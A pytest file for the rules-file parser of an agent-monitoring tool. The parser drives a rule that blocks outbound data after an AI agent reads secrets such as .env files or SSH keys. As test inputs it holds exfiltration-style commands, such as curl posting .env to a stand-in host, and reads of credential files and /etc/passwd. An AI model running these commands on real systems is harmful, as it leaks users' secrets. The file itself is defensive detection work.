"""The rules file (V5b): what `rulefile.parse` accepts, refuses and matches. Pure: no recorder."""

from __future__ import annotations

import fnmatch
import gc
import itertools
import json
import re
import time
from pathlib import Path
from typing import Any

import pytest

from agentfly.cli import serve
from agentfly.recorder import rulefile
from agentfly.recorder.rulefile import Clause, RuleFile
from tests.rules_helpers import list_line

BASE_LISTS = (
    "[lists]\n"
    'names = [".env", ".env.*"]\n'
    'ok = [".env*.example"]\n'
    'cmds = ["npm publish"]\n'
    'hosts = ["localhost"]\n'
)

MATCH = """
[[rule]]
id = "M1"
kind = "match"
severity = "warn"
message = "careful"
event = ["shell"]
command = "cmds"
  [[rule.test]]
  steps = ["shell: npm publish"]
  expect = "warn"
  [[rule.test]]
  steps = ["shell: ls"]
  expect = "allow"
"""

AFTER_THEN = """
[[rule]]
id = "A1"
kind = "after_then"
severity = "block"
message = "no publishing after a .env read"
after = { event = ["read", "shell"], path = "names", path_except = "ok" }
then = { event = ["shell"], command = "cmds" }
  [[rule.test]]
  steps = ["read: .env", "shell: npm publish"]
  expect = "block"
  [[rule.test]]
  steps = ["shell: npm publish"]
  expect = "allow"
"""


def doc(*rules: str, lists: str = BASE_LISTS, head: str = "schema = 1\n") -> str:
    return head + lists + "".join(rules)


def good(text: str) -> RuleFile:
    parsed = rulefile.parse(text)
    assert parsed.errors == (), parsed.errors
    return parsed


def errors_of(text: str) -> str:
    parsed = rulefile.parse(text)
    assert parsed.errors, "expected the file to be refused"
    return "\n".join(parsed.errors)


def shell(command: str) -> dict[str, Any]:
    return {"hook_event_name": "beforeShellExecution", "command": command}


def read(path: str) -> dict[str, Any]:
    return {"hook_event_name": "beforeReadFile", "file_path": path}


def write(path: str) -> dict[str, Any]:
    return {
        "hook_event_name": "preToolUse",
        "tool_name": "Write",
        "tool_input": {"file_path": path},
    }


def clause_of(text: str) -> Clause:
    """The clause of the first rule, a `match` rule, in a file that must load."""
    clause = good(text).rules[0].clause
    assert clause is not None
    return clause


def plain_glob(pattern: tuple[str, ...], segments: tuple[str, ...]) -> bool:
    """The walk as it was before it dropped positions that cannot finish: the reference."""
    positions = {0}
    for part in pattern:
        if part == "**":
            reached = set(range(min(positions), len(segments) + 1))
        else:
            reached = {
                i + 1
                for i in positions
                if i < len(segments) and fnmatch.fnmatchcase(segments[i], part)
            }
        if not reached:
            return False
        positions = reached
    return len(segments) in positions


@pytest.mark.slow
def test_the_walk_that_drops_hopeless_positions_answers_as_the_plain_walk_does() -> None:
    parts = ["**", "a", "?", "b*", "[ab]"]
    names = ["a", "b", "ab"]
    for count in range(6):
        for pattern in itertools.product(parts, repeat=count):
            for length in range(6):
                for segments in itertools.product(names, repeat=length):
                    assert rulefile._glob(pattern, segments) == plain_glob(pattern, segments), (
                        pattern,
                        segments,
                    )


def test_a_pattern_longer_than_the_path_tries_no_part(monkeypatch: pytest.MonkeyPatch) -> None:
    tried = []
    monkeypatch.setattr(fnmatch, "fnmatchcase", lambda name, part: tried.append(part) or True)
    assert not rulefile._glob(("?",) * 50, ["a"] * 10)  # no ** : the path has to be 50 long
    assert not rulefile._glob(("**", *("?",) * 50), ["a"] * 10)  # too short for the 50 parts
    assert not rulefile._glob(("?", "?"), ["a"] * 3)  # no ** : not exactly as long
    assert tried == []


# ---------------------------------------------------------------- the packaged default


def test_the_packaged_default_is_clean_and_holds_r1() -> None:
    loaded = rulefile.load_default()
    assert loaded.errors == () and loaded.lint == ()
    r1 = loaded.rules[0]
    assert (r1.id, r1.kind, r1.severity) == ("R1", "after_then", "block")
    assert r1.message == (
        "Blocked by rule R1: a secret was read earlier in this session, "
        "and now data is being sent out."
    )
    assert r1.then is not None and r1.then.command_class == "outbound"


def test_the_packaged_default_is_the_text_init_will_install() -> None:
    assert rulefile.default_text() == rulefile.default_path().read_text(encoding="utf-8")
    assert rulefile.default_path().name == "default.toml"


# ----------------------------------------------- R1 lists answer as is_sensitive did


def old_is_sensitive(path: str) -> bool:
    """A copy of `names.is_sensitive` as it was before V5b: the oracle for the file's lists."""
    name = Path(path).name.casefold()
    if name == ".env" or name.startswith(".env."):
        return not name.endswith((".example", ".sample", ".template"))
    if name.endswith((".pem", ".key")):
        return True
    if name.startswith("id_rsa") and not name.endswith(".pub"):
        return True
    if name.startswith("credentials"):
        return True
    return False


def old_names_secret(word: str) -> bool:
    return old_is_sensitive(word) or any(
        old_is_sensitive(part) for part in (word.rsplit("=", 1)[-1], word.rsplit("@", 1)[-1])
    )


def r1_after() -> Clause:
    after = rulefile.load_default().rules[0].after
    assert after is not None
    return after


ATOMS = [
    "",
    ".env",
    ".ENV",
    "id_rsa",
    "credentials",
    "x",
    ".pem",
    ".key",
    ".pub",
    ".example",
    ".sample",
    ".template",
    ".local",
    ".",
    "2",
]


def candidate_names() -> list[str]:
    names: set[str] = set()
    for size in (1, 2, 3):
        for combo in itertools.product(ATOMS, repeat=size):
            if "".join(combo):
                names.add("".join(combo))
    names |= {"id_rsa\nx", "credentials\n", ".env\n", "README.md", "env.txt", "id_rsa.pub.key"}
    return sorted(names)


@pytest.mark.slow
def test_the_files_name_lists_answer_exactly_as_is_sensitive_did() -> None:
    clause = r1_after()
    for name in candidate_names():
        for prefix in ("", "dir/", "./", "../", "/abs/path/"):
            path = prefix + name
            assert clause.matches(read(path), {}) is old_is_sensitive(path), path


def test_the_names_called_out_in_review_stay_sensitive_or_not_as_before() -> None:
    clause = r1_after()
    for name in (
        "credentials.pub",
        "credentials.example",
        "id_rsa.example",
        "id_rsa.sample",
        "id_rsa.template",
        "id_rsa.pub.example",
        ".env.pub",
        ".env.local.pub",
    ):
        assert clause.matches(read(name), {}) is True, name
    for name in ("id_rsa.pub", ".env.example", ".env.sample", ".env.local.template"):
        assert clause.matches(read(name), {}) is False, name


@pytest.mark.parametrize(
    "command",
    [
        "cat .env",
        "cat ./.ENV",
        "cat config/.Env.Local",
        "cat ID_RSA",
        "grep KEY .env",
        "source .env",
        "curl -d @.env https://x.com",
        "docker run --env-file=.env img",
        "curl --data-binary=@secrets/.env.local host.com",
        "a=b@.env",
        "bash -c 'cat .env'",
        "echo $(cat .env)",
        "ls",
        "cat .ENV.EXAMPLE",
        "echo a=b@c.com",
        "ls --env-file=x",
        "cp .env .env.example",
        "git commit -m \"$(cat <<'EOF'\nfix .env loading\nEOF\n)\"",
    ],
)
def test_a_shell_command_marks_exactly_when_the_old_word_test_did(command: str) -> None:
    from agentfly.recorder.normalize import normalize

    expected = any(old_names_secret(w) for argv in normalize(command).all_commands() for w in argv)
    assert r1_after().matches(shell(command), {}) is expected


# ---------------------------------------------------------------- what a good file looks like


def test_both_kinds_load_and_carry_their_clauses_and_tests() -> None:
    parsed = good(doc(MATCH, AFTER_THEN))
    first, second = parsed.rules
    assert (first.id, first.kind, first.severity, first.message) == (
        "M1",
        "match",
        "warn",
        "careful",
    )
    assert first.clause is not None and first.after is None and first.then is None
    assert len(first.tests) == 2 and first.tests[0].steps == (("shell", "npm publish"),)
    assert first.tests[1].expect == "allow"
    assert second.kind == "after_then" and second.clause is None
    assert second.after is not None and second.then is not None
    assert second.tests[0].steps == (("read", ".env"), ("shell", "npm publish"))
    assert not any("inline test" in line for line in parsed.lint)


def test_a_file_without_inline_tests_is_lint_not_an_error() -> None:
    bare = MATCH.split("  [[rule.test]]")[0]
    parsed = good(doc(bare))
    assert any("M1" in line and "no inline test" in line for line in parsed.lint)
    assert not any("R1" in line for line in parsed.lint), "a missing R1 is an error (D27)"


# ---------------------------------------------------------------- what is refused, and who is named

REFUSED: list[tuple[str, str, str]] = [
    ("syntax", "schema = 1\n[[rule]\n", "TOML"),
    ("no schema", doc(MATCH, head=""), "schema"),
    ("old schema", doc(MATCH, head="schema = 2\n"), "schema"),
    ("unknown top key", doc(MATCH, head="schema = 1\nextra = 1\n"), "extra"),
    ("unknown rule field", doc(MATCH.replace('id = "M1"', 'id = "M1"\ncolour = "red"')), "colour"),
    ("unknown list", doc(MATCH.replace('"cmds"', '"nope"')), "nope"),
    ("list not an array", doc(MATCH, lists='[lists]\ncmds = "npm publish"\n'), "cmds"),
    ("empty list", doc(MATCH, lists="[lists]\ncmds = []\n"), "cmds"),
    ("R0", doc(MATCH.replace('"M1"', '"R0"')), "R0"),
    ("r0 in lower case", doc(MATCH.replace('"M1"', '"r0"')), "R0"),
    ("duplicate id", doc(MATCH, MATCH), "duplicate"),
    ("bad severity", doc(MATCH.replace('"warn"', '"fatal"', 1)), "M1"),
    ("bad kind", doc(MATCH.replace('"match"', '"count"')), "count"),
    ("bad event", doc(MATCH.replace('["shell"]', '["mcp"]')), "mcp"),
    ("no event", doc(MATCH.replace('event = ["shell"]\n', "")), "event"),
    ("empty message", doc(MATCH.replace('"careful"', '""')), "message"),
    ("id is a number", doc(MATCH.replace('id = "M1"', "id = 5")), "id"),
    ("rule is a table", doc("[rule]\nid = 'x'\n"), "rule"),
    (
        "after_then without then",
        doc(AFTER_THEN.replace('then = { event = ["shell"], command = "cmds" }', "")),
        "A1",
    ),
    (
        "condition at the top of after_then",
        doc(AFTER_THEN.replace("[[rule.test]]", 'path = "names"\n  [[rule.test]]', 1)),
        "A1",
    ),
    (
        "unknown field inside then",
        doc(AFTER_THEN.replace('command = "cmds" }', 'command = "cmds", extra = 1 }')),
        "extra",
    ),
    (
        "path in a match is a list, not a name",
        doc(MATCH.replace('command = "cmds"', 'path = [".env"]')),
        "M1",
    ),
    ("command condition on a read", doc(MATCH.replace('["shell"]', '["read"]')), "shell"),
    (
        "unknown command class",
        doc(MATCH.replace('command = "cmds"', 'command_class = "carrier"')),
        "carrier",
    ),
    (
        "wildcard in a command pattern",
        doc(MATCH, lists='[lists]\ncmds = ["curl --data*"]\n'),
        "wildcard",
    ),
    ("event-only match", doc(MATCH.replace('command = "cmds"\n', "")), "every"),
    (
        "event-only after",
        doc(
            AFTER_THEN.replace(
                'after = { event = ["read", "shell"], path = "names", path_except = "ok" }',
                'after = { event = ["read"] }',
            )
        ),
        "every",
    ),
    ("path_except alone", doc(MATCH.replace('command = "cmds"', 'path_except = "ok"')), "path"),
    ("test without steps", doc(MATCH.replace('steps = ["shell: ls"]', "steps = []")), "M1"),
    ("test with a bad expect", doc(MATCH.replace('expect = "allow"', 'expect = "deny"')), "deny"),
    ("test with a bad step event", doc(MATCH.replace('"shell: ls"', '"mcp: ls"')), "mcp"),
    ("test step without a colon", doc(MATCH.replace('"shell: ls"', '"ls"')), "M1"),
    (
        "test with an unknown key",
        doc(MATCH.replace('expect = "allow"', 'expect = "allow"\n  note = "x"')),
        "note",
    ),
]


@pytest.mark.parametrize(("label", "text", "needle"), REFUSED, ids=[r[0] for r in REFUSED])
def test_a_bad_file_is_refused_with_a_message_naming_the_problem(
    label: str, text: str, needle: str
) -> None:
    message = errors_of(text)
    assert needle.casefold() in message.casefold(), message


def path_rule_file(pattern: str) -> str:
    return doc(
        MATCH.replace('command = "cmds"', 'path = "names"').replace('["shell"]', '["read"]'),
        lists=f"[lists]\nnames = {json.dumps([pattern])}\n",
    )


@pytest.mark.parametrize(
    "pattern",
    [
        "*",
        "**",
        "**/*",
        "/**",
        "*/*",
        "**/**",
        "?*",
        "[!x]*",  # any name that does not start with x
        "*[a-z]*",  # any name with a lower-case letter
        "[a-z]",
        "[!x]",
        "*[!.]*",
        "**/[!x]*",
        "[]]*",  # a class that holds `]`
        "[!]x]*",
        "*[a-z]*[0-9]*",
        "/",  # the root folder and everything in it
        "//",
        "./",
        "./.",
    ],
)
def test_a_path_pattern_that_matches_everything_is_refused(pattern: str) -> None:
    assert "every" in errors_of(path_rule_file(pattern)).casefold()


@pytest.mark.parametrize(
    "pattern",
    [
        "id_rsa*",
        "*.p[e]m",  # a class beside characters a name must contain
        "[.]env",
        "*.[ch]",
        "[]]x",
        "[",  # never closed: a plain character
        "*[",
        "???",  # no `*` and no class: names of three characters, nothing wider
        "~/[a-z]*",  # anchored at the home folder by its `~`
        "cfg/[!x]*",
        "~/",  # the home folder and all in it: a folder, not every path
        "/etc/",
        "cfg/",
    ],
)
def test_a_pattern_with_something_a_name_must_contain_is_accepted(pattern: str) -> None:
    assert good(path_rule_file(pattern)).errors == ()


def test_a_command_pattern_with_no_program_is_refused() -> None:
    assert errors_of(doc(MATCH, lists='[lists]\ncmds = ["  "]\n'))


def test_too_many_wildcards_in_one_path_pattern_are_refused() -> None:
    stars = "*a" * (rulefile.MAX_STARS + 1)
    text = doc(
        MATCH.replace('command = "cmds"', 'path = "names"').replace('["shell"]', '["read"]'),
        lists=f'[lists]\nnames = ["{stars}"]\n',
    )
    assert "wildcard" in errors_of(text).casefold()


def test_a_very_deeply_nested_file_is_refused_not_crashed() -> None:
    text = "schema = 1\na = " + "[" * 6000 + "]" * 6000 + "\n"
    assert rulefile.parse(text).errors


def test_a_rule_test_before_any_rule_is_refused() -> None:
    assert errors_of('schema = 1\n[[rule.test]]\nsteps = ["shell: ls"]\nexpect = "allow"\n')


def test_every_problem_is_listed_not_only_the_first() -> None:
    text = doc(
        MATCH.replace('"warn"', '"fatal"').replace('"cmds"', '"nope"'),
        AFTER_THEN.replace('"names"', '"nada"'),
    )
    parsed = rulefile.parse(text)
    joined = "\n".join(parsed.errors)
    assert "M1" in joined and "A1" in joined and "nope" in joined and "nada" in joined


@pytest.mark.parametrize("junk", [b"\xff\xfe\x00bad", b"\x80" * 50, b"", b"\x00" * 10])
def test_loading_bytes_that_are_not_text_or_not_toml_never_raises(
    tmp_path: Path, junk: bytes
) -> None:
    path = tmp_path / "rules.toml"
    path.write_bytes(junk)
    assert rulefile.load_file(path).errors


def test_loading_a_missing_a_big_or_a_folder_path_is_an_error_not_a_crash(tmp_path: Path) -> None:
    assert rulefile.load_file(tmp_path / "nope.toml").errors
    assert rulefile.load_file(tmp_path).errors
    big = tmp_path / "big.toml"
    big.write_bytes(b"#" * (rulefile.MAX_FILE_BYTES + 1))
    assert "large" in "\n".join(rulefile.load_file(big).errors)


# ---------------------------------------------------------------- the matchers


def path_clause(*patterns: str, event: str = "read", ok: tuple[str, ...] = ()) -> Clause:
    lists = "[lists]\n" + list_line("names", *patterns) + (list_line("ok", *ok) if ok else "")
    condition = 'path = "names"' + ('\npath_except = "ok"' if ok else "")
    rule = MATCH.replace('command = "cmds"', condition).replace('["shell"]', f'["{event}"]')
    return clause_of(doc(rule, lists=lists))


def bare_clause(*patterns: str, event: str = "read") -> Clause:
    """A clause built from patterns directly: it has not been through a file's work budget, so a
    test of what one clause costs can use more patterns than a file may hold."""
    return Clause((event,), tuple(rulefile.compile_pattern(p) for p in patterns))


def test_a_pattern_without_a_slash_matches_the_file_name_in_any_case() -> None:
    clause = path_clause(".env", "*.pem")
    assert clause.matches(read("/a/b/.ENV"), {}) and clause.matches(read("x/Key.PEM"), {})
    assert not clause.matches(read("/a/.env/notes.txt"), {})
    assert not clause.matches(read("/a/env"), {})


def test_a_slash_pattern_matches_the_whole_path_and_double_star_crosses_folders() -> None:
    clause = path_clause("/etc/*", "**/secret.txt", "src/**/gen.py")
    assert clause.matches(read("/etc/hosts"), {})
    assert not clause.matches(read("/etc/ssh/config"), {})
    assert clause.matches(read("secret.txt"), {}), "** also matches zero folders"
    assert clause.matches(read("/a/b/c/SECRET.txt"), {})
    assert clause.matches(read("/w/src/gen.py"), {}) and clause.matches(
        read("/w/src/a/b/gen.py"), {}
    )
    assert not clause.matches(read("/w/lib/gen.py"), {})


def test_a_relative_slash_pattern_matches_anywhere_in_the_path() -> None:
    clause = path_clause(".github/workflows/**")
    assert clause.matches(read(".github/workflows/ci.yml"), {})
    assert clause.matches(read("/work/proj/.github/workflows/sub/ci.yml"), {})
    assert not clause.matches(read("/work/proj/docs/ci.md"), {})


def test_a_tilde_pattern_is_the_users_home(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("HOME", str(tmp_path))
    clause = path_clause("~/.ssh/**")
    assert clause.matches(read(f"{tmp_path}/.ssh/id_ed25519"), {})
    assert not clause.matches(read("/elsewhere/.ssh/id_ed25519"), {})


EXCEPTING_MATCH = MATCH.replace('command = "cmds"', 'path = "names"\npath_except = "excepted"')
EXCEPTING_AFTER = AFTER_THEN.replace('path_except = "ok"', 'path_except = "excepted"')


@pytest.mark.parametrize(("rule", "rid"), [(EXCEPTING_MATCH, "M1"), (EXCEPTING_AFTER, "A1")])
@pytest.mark.parametrize("exception", [".ssh/**", "a/**/b", "**/x/**"])
def test_a_floating_exception_is_refused_in_any_rule(rule: str, rid: str, exception: str) -> None:
    """V5b-fix2 §4.6: an exception is tried on every word whose path matched, so one that walks
    the path is refused, naming the rule."""
    assert rulefile.floating(rulefile.compile_pattern(exception))
    text = doc(rule, lists=BASE_LISTS + list_line("excepted", exception))
    assert errors_of(text) == (
        f"rule {rid}: exception {exception!r} is checked at every folder of a path; an exception "
        "must be a name, anchored ('~/...' or '/...'), or end at the file name"
    )


@pytest.mark.parametrize(("rule", "rid"), [(EXCEPTING_MATCH, "M1"), (EXCEPTING_AFTER, "A1")])
@pytest.mark.parametrize("exception", ["~/.ssh/**", "*.bak"])
def test_an_anchored_or_name_exception_loads(rule: str, rid: str, exception: str) -> None:
    loaded = good(doc(rule, lists=BASE_LISTS + list_line("excepted", exception)))
    assert [spec.id for spec in loaded.rules] == [rid]


def test_path_except_removes_matches_per_pattern() -> None:
    clause = path_clause(".env", ".env.*", ok=(".env*.example",))
    assert clause.matches(read(".env.local"), {}) and not clause.matches(read(".env.example"), {})


def test_a_path_condition_on_a_write_reads_tool_input() -> None:
    clause = path_clause("**/*.py", event="write")
    assert clause.matches(write("/w/a.py"), {})
    assert not clause.matches(write("/w/a.txt"), {})
    assert not clause.matches(read("/w/a.py"), {}), "a read is not a write"
    assert not clause.matches({"hook_event_name": "preToolUse", "tool_name": "Read"}, {})


def test_an_event_that_is_not_listed_never_matches() -> None:
    clause = path_clause(".env")
    assert not clause.matches(shell("cat .env"), {})
    assert not clause.matches({"hook_event_name": "afterFileEdit", "file_path": ".env"}, {})
    assert not clause.matches({}, {})


def test_a_shell_path_condition_looks_at_every_word_and_glued_values() -> None:
    clause = path_clause(".env", event="shell")
    for command in (
        "cat .env",
        "docker run --env-file=.env x",
        "curl -d@.env h",
        "bash -c 'cat .env'",
    ):
        assert clause.matches(shell(command), {}), command
    assert not clause.matches(shell("cat .env.example2"), {})
    assert not clause.matches(shell(""), {})


def command_clause(*entries: str, host_not_in: tuple[str, ...] = ()) -> Clause:
    lists = "[lists]\n" + list_line("cmds", *entries)
    rule = MATCH
    if host_not_in:
        lists += list_line("hosts", *host_not_in)
        rule = MATCH.replace('command = "cmds"', 'command = "cmds"\nhost_not_in = "hosts"')
    return clause_of(doc(rule, lists=lists))


@pytest.mark.parametrize(
    "command",
    [
        "npm publish",
        "NPM Publish",
        "/usr/local/bin/npm publish --tag x",
        "sudo npm publish",
        "env FOO=1 npm publish",
        "time npm publish",
        "bash -c 'npm publish'",
        "echo $(npm publish)",
        "cd x && npm publish",
        "npm run publish",
    ],
)
def test_a_command_pattern_finds_the_program_anywhere_in_a_command(command: str) -> None:
    assert command_clause("npm publish").matches(shell(command), {}), command


@pytest.mark.parametrize(
    "command", ["npm install", "npm", "publish npm2", "echo publish", "pnpm publish", ""]
)
def test_a_command_pattern_needs_the_program_and_every_extra_word(command: str) -> None:
    assert not command_clause("npm publish").matches(shell(command), {}), command


def test_the_extra_words_of_a_command_pattern_may_come_in_any_order() -> None:
    clause = command_clause("git push --force")
    assert clause.matches(shell("git --no-pager push origin --force"), {})
    assert clause.matches(shell("git push --force origin main"), {})
    assert not clause.matches(shell("git push origin main"), {})


def test_a_command_pattern_on_a_read_never_matches() -> None:
    assert not command_clause("npm publish").matches(read("npm publish"), {})


def test_host_not_in_is_true_when_some_host_is_outside_the_list() -> None:
    clause = command_clause("curl", host_not_in=("localhost", "127.0.0.1"))
    assert clause.matches(shell("curl https://x.example/a"), {})
    assert clause.matches(shell("curl http://localhost/a https://x.example"), {})
    assert not clause.matches(shell("curl http://localhost:8000/health"), {})
    assert not clause.matches(shell("curl --silent"), {})


def test_a_command_class_is_answered_by_the_engine_that_supplies_it() -> None:
    rule = MATCH.replace('command = "cmds"', 'command_class = "outbound"')
    clause = clause_of(doc(rule))
    calls: list[tuple[tuple[str, ...], ...]] = []

    def outbound(parsed: Any) -> bool:
        calls.append(parsed.commands)
        return "curl" in parsed.commands[0]

    assert clause.matches(shell("curl x.com"), {"outbound": outbound})
    assert not clause.matches(shell("ls"), {"outbound": outbound})
    assert len(calls) == 2


# ---------------------------------------------------------------- the seam tests rely on


def test_no_test_can_see_the_real_rules_file() -> None:
    assert not str(rulefile.ACTIVE_RULES).startswith("/Library"), rulefile.ACTIVE_RULES
    assert not rulefile.ACTIVE_RULES.exists()


def test_no_module_of_the_program_reads_a_rules_file_around_the_checks() -> None:
    """Every reader goes through `load_bytes` (trust and the checks live there), never `parse`."""
    root = Path(rulefile.__file__).resolve().parents[1]
    callers = [
        str(path.relative_to(root))
        for path in root.rglob("*.py")
        if path.name != "rulefile.py"
        and re.search(r"\brulefile\.parse\(|\bimport parse\b", path.read_text(encoding="utf-8"))
    ]
    assert callers == []


def test_nothing_in_the_rules_file_module_reads_the_environment() -> None:
    text = Path(rulefile.__file__).read_text(encoding="utf-8")
    assert not re.search(r"\benviron\b|getenv", text)


def test_serve_offers_the_port_and_nothing_that_moves_the_rules() -> None:
    import argparse

    parser = argparse.ArgumentParser()
    commands = parser.add_subparsers(dest="command")
    serve.add_parser(commands)
    options = {s for a in commands.choices["serve"]._actions for s in a.option_strings}
    assert options == {"-h", "--help", "--port"}


# ---------------------------------------------------------------- found by the final audit


def test_a_command_that_repeats_the_program_thousands_of_times_is_matched_in_linear_time() -> None:
    """The decision runs on the event loop with a 0.5 s client budget: no quadratic scan.

    Four times the words must cost about four times as much (a quadratic scan: sixteen), judged
    against the shorter command timed in this test. Each round matches commands no earlier round
    matched (one more `npm` each): the matcher keeps caches per command, and a repeat would time
    a lookup, not the scan.
    """
    clause = command_clause("npm publish")
    fastest = {3_000: float("inf"), 12_000: float("inf")}
    was_on = gc.isenabled()
    gc.disable()  # CPU time and no collector pauses: a busy machine and a big heap leave it alone
    try:
        for extra in range(7):
            for words in fastest:  # in turns, so that nothing favours one size
                repeated = "npm " * (words + extra)
                miss, hit = shell(repeated + "x"), shell(repeated + "publish")
                started = time.process_time()
                assert not clause.matches(miss, {})
                assert clause.matches(hit, {})
                fastest[words] = min(fastest[words], time.process_time() - started)
    finally:
        if was_on:
            gc.enable()
    short, long = fastest[3_000], fastest[12_000]
    assert long < 8 * short, f"4 times the words took {long / short:.1f} times as long"


def test_a_repeated_program_word_does_not_change_which_extra_words_are_needed() -> None:
    clause = command_clause("git push --force")
    assert clause.matches(shell("env git git push --force"), {})
    assert clause.matches(shell("git git push git --force"), {})
    assert not clause.matches(shell("git git push"), {})


@pytest.mark.parametrize("bad", ['["outbound"]', "{}", "5", "true"])
def test_a_command_class_of_the_wrong_type_is_reported_against_its_rule(bad: str) -> None:
    text = doc(MATCH.replace('command = "cmds"', f"command_class = {bad}"))
    message = errors_of(text)
    assert "M1" in message and "command_class" in message and "TypeError" not in message


def test_host_not_in_alone_is_refused_because_it_matches_any_dotted_word() -> None:
    text = doc(MATCH.replace('command = "cmds"', 'host_not_in = "hosts"'))
    message = errors_of(text)
    assert "M1" in message and "host_not_in" in message and "command" in message


def test_host_not_in_with_a_command_or_a_class_is_fine() -> None:
    command_clause("curl", host_not_in=("localhost",))
    with_class = MATCH.replace(
        'command = "cmds"', 'command_class = "outbound"\nhost_not_in = "hosts"'
    )
    good(doc(with_class))


@pytest.mark.parametrize(
    "word",
    [
        "{home}/.aws/credentials",
        "~/.aws/credentials",
        "$HOME/.aws/credentials",
        "${{HOME}}/.aws/credentials",
        "{home}/x/../.aws/credentials",
        "{home}//.aws/./credentials",
    ],
)
def test_a_home_pattern_matches_the_usual_spellings_of_the_path(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, word: str
) -> None:
    monkeypatch.setenv("HOME", str(tmp_path))
    clause = path_clause("~/.aws/credentials", event="shell")
    assert clause.matches(shell("cat " + word.format(home=tmp_path)), {})
    assert clause.matches(read(word.format(home=tmp_path)), {}) is False, "a read is not a shell"


@pytest.mark.parametrize(
    "path", ["/etc/passwd", "/etc/../etc/passwd", "/etc//passwd", "/etc/./passwd"]
)
def test_an_absolute_pattern_sees_through_dot_dot_and_doubled_slashes(path: str) -> None:
    clause = path_clause("/etc/passwd")
    assert clause.matches(read(path), {})
    assert not clause.matches(read("/etc/../var/passwd"), {})


def test_a_relative_dot_dot_that_leaves_the_pattern_does_not_match() -> None:
    clause = path_clause("secrets/key.txt")
    assert clause.matches(read("app/secrets/key.txt"), {})
    assert not clause.matches(read("app/secrets/../key.txt"), {})


# ---------------------------------------------------------------- found by /code-review


@pytest.mark.parametrize("pattern", ["~/.ssh/", ".github/workflows/", "/etc/ssh/"])
def test_a_directory_pattern_with_a_trailing_slash_covers_what_is_inside_it(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, pattern: str
) -> None:
    monkeypatch.setenv("HOME", str(tmp_path))
    clause = path_clause(pattern)
    inside = {
        "~/.ssh/": f"{tmp_path}/.ssh/id_ed25519",
        ".github/workflows/": "/w/.github/workflows/ci.yml",
        "/etc/ssh/": "/etc/ssh/sshd_config",
    }[pattern]
    assert clause.matches(read(inside), {})
    assert clause.matches(read(inside.rsplit("/", 1)[0]), {}), "the folder itself too"
    assert not clause.matches(read("/elsewhere/other/file"), {})


def test_hundreds_of_slash_patterns_against_hundreds_of_words_do_one_test_per_pair(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The decision runs on the event loop under the hook client's 0.5 s wait.

    The bound is on work (one glob per pattern and word), not on seconds: a time limit tight
    enough to mean something fails on a loaded machine, and a loose one proves nothing. (A file
    may not hold this many patterns any more, see `test_rules_cost.py`; one clause can.)
    """
    patterns = 200
    clause = bare_clause(*[f"/opt/p{i}/**/x{i}.txt" for i in range(patterns)], event="shell")
    words = 300
    command = "cat " + " ".join(f"/home/me/project/src/file{i}.py" for i in range(words))
    calls = 0
    real = rulefile._glob

    def counting(*args: Any) -> bool:
        nonlocal calls
        calls += 1
        return real(*args)

    monkeypatch.setattr(rulefile, "_glob", counting)
    assert not clause.matches(shell(command), {})
    assert calls <= patterns * (words + 1), "more than one glob per pair"


def test_one_path_is_resolved_once_however_many_patterns_look_at_it() -> None:
    rulefile._folded_segments.cache_clear()
    clause = bare_clause(*[f"/opt/p{i}/**/x.txt" for i in range(50)])
    clause.matches(read("/home/me/a/../b/file.py"), {})
    info = rulefile._folded_segments.cache_info()
    assert info.misses == 1 and info.hits == 49


def test_the_file_the_recorder_would_load_is_the_active_one_only_when_it_exists(
    active_rules: Path,
) -> None:
    assert rulefile.in_force_path() == (rulefile.default_path(), False)
    active_rules.write_text("anything", encoding="utf-8")
    assert rulefile.in_force_path() == (active_rules, True)
    active_rules.unlink()
    active_rules.symlink_to(
        "nowhere"
    )  # a dangling link is still "there": it is reported, not hidden
    assert rulefile.in_force_path() == (active_rules, True)
